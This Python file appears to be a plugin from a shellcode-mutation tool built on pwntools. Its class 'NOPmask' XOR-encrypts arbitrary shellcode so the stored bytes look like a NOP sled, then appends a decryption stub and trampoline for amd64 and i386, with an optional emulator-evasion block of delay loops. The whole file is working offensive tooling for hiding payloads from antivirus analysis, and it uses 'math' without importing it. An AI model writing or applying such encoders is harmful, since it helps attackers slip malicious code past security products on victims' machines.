import os
import tempfile
from pwn import *

AMD64_GET_RIP_LEN = 0x07
DWORD_LEN = 0x04
I386_GET_EIP_LEN = 0x05
NOP_SLED_LEN = 0x08
## Assembly stubs
AMD64_GET_RIP = "lea rax, [rip]\n"
I386_GET_EIP = """
call getEIP
getEIP:
    pop eax
"""
EMULATOR_EVASION_STUB = """
mov ecx, 0xFFFFFFFF
delay_loop1:
    loop delay_loop1
mov ecx, 0xFFFFFFFF
delay_loop2:
    loop delay_loop2
mov ecx, 0xFFFFFFFF
delay_loop3:
    loop delay_loop3
mov ecx, 0xFFFFFFFF
delay_loop4:
    loop delay_loop4
mov ecx, 0xFFFFFFFF
delay_loop5:
    loop delay_loop5
"""
NOP_SLED = b'\x90' * NOP_SLED_LEN


class NOPmask:

    def __init__(self, arguments: dict) -> None:
        pass

    def getKey(self, shellcode):
        return [shellcode[i] ^ 0x90 for i in range(len(shellcode))]

    def getEncryptedShellcode(self, shellcode, key):
        return bytes([shellcode[i] ^ key[i] for i in range(len(shellcode))])

    def apply(self, shellcode: bytes) -> bytes:

        context.arch = 'amd64'
        key = self.getKey(shellcode)
        encryptedShellcode = self.getEncryptedShellcode(shellcode, key)

        shellcodeLen = len(shellcode)
        jmpLen = 0x2 if shellcodeLen<0x82 else 0x5
        trampoline = f"jmp $+{hex(shellcodeLen + (NOP_SLED_LEN * 2) + jmpLen)}\n"

        decryptStub = ""
        if (context.arch == 'amd64'):
            context.bits = 64
            decryptStub += AMD64_GET_RIP
            shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + AMD64_GET_RIP_LEN
            for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
                k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
                decryptStub += f"xor DWORD PTR [rax - {hex(shellcodeOffset)}], {hex(k)}\n"
                shellcodeOffset -= DWORD_LEN
                key = key[DWORD_LEN:]
            trampolineBack = f"sub rax, {hex(shellcodeStart)}\n"
            trampolineBack += f"jmp rax\n"
        elif (context.arch == 'i386'):
            context.bits = 32
            decryptStub += I386_GET_EIP
            shellcodeStart = shellcodeOffset = shellcodeLen + NOP_SLED_LEN + I386_GET_EIP_LEN
            for i in range(math.ceil(shellcodeLen/DWORD_LEN)):
                k = int.from_bytes(key[:DWORD_LEN], byteorder="little")
                decryptStub += f"xor DWORD PTR [eax - {hex(shellcodeOffset)}], {hex(k)}\n"
                shellcodeOffset -= DWORD_LEN
                key = key[DWORD_LEN:]
            trampolineBack = f"sub eax, {hex(shellcodeStart)}\n"
            trampolineBack += f"jmp eax\n"

        newShellcode = asm(trampoline) + NOP_SLED + encryptedShellcode + NOP_SLED + asm(decryptStub) + asm(trampolineBack)
        
        if args.evader:
            newShellcode = asm(EMULATOR_EVASION_STUB) + newShellcode
    
        return newShellcode
